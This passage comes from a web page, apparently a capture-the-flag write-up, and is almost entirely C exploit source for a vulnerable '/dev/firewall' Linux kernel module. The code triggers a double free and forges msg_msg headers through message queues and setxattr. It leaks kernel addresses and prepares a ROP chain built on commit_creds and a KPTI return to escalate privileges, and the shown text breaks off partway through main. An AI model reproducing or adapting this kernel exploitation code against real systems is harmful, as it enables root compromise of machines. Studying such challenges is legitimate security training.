class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_size 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 0xbaad5aad</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKIP -1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">&#125; User_rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> ip;</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">uint8_t</span> is_duplicated;</span><br><span class="line">&#125; Rule_t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;user_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> msg_id[<span class="number">3</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">size_t</span> <span class="built_in">queue</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernelbase=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> page_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> current_task=<span class="number">0</span>,prev_task=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page1=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *page2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">pthread_t</span> td[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> is_write_msg=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_obj=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> seq_fd=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> add_rsp_0x108_pop_3=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret=<span class="number">0xffffffff8102af06</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_cred=<span class="number">0xffffffff8106f870</span>;</span><br><span class="line"><span class="keyword">size_t</span> kpti_addr=<span class="number">0xffffffff81600df0</span>+<span class="number">0x10</span>;</span><br><span class="line"><span class="keyword">size_t</span> ret=<span class="number">0xffffffff810001dc</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;exp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;31m %s\e[0m\n&quot;</span>,err);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%d.%d.%d.%d\n&quot;,(ip&amp;0xff),(ip&amp;0x0000ff00)&gt;&gt;8,(ip&amp;0x00ff0000)&gt;&gt;16,(ip&amp;0xff000000)&gt;&gt;24);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="comment">// if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//     err_exit(&quot;add fail&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_id[<span class="number">0</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">1</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    msg_id[<span class="number">2</span>]=make_queue(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    user_msg *msg=(user_msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">10</span>;i&lt;<span class="number">16</span>;i++)&#123;</span><br><span class="line">        add_rule(fd,i,INBOUND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x64</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x65</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1008</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] doublefree\n&quot;</span>);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,OUTBOUND);</span><br><span class="line">    msg_header *fake_msg_header=(msg_header *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_msg_header-&gt;ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1050</span>;</span><br><span class="line">    fake_msg_header-&gt;next=page_msg<span class="number">-0x10</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1050</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;cccccccccccccccc&quot;</span>,<span class="number">0x10</span>))&#123;</span><br><span class="line">            target_obj=re_buf[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m target_obj_addr:%p \e[0m\n&quot;</span>,target_obj);</span><br><span class="line"></span><br><span class="line">    fake_msg_header-&gt;ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header-&gt;next=target_obj;</span><br><span class="line">    fake_msg_header-&gt;security=<span class="number">0</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">2</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1008</span>,<span class="number">4</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">3</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">1</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> seq_operation[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    add_rsp_0x108_pop_3=add_rsp_0x108_pop_3-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    pop_rdi_ret=pop_rdi_ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    commit_cred=commit_cred-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    kpti_addr=kpti_addr-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    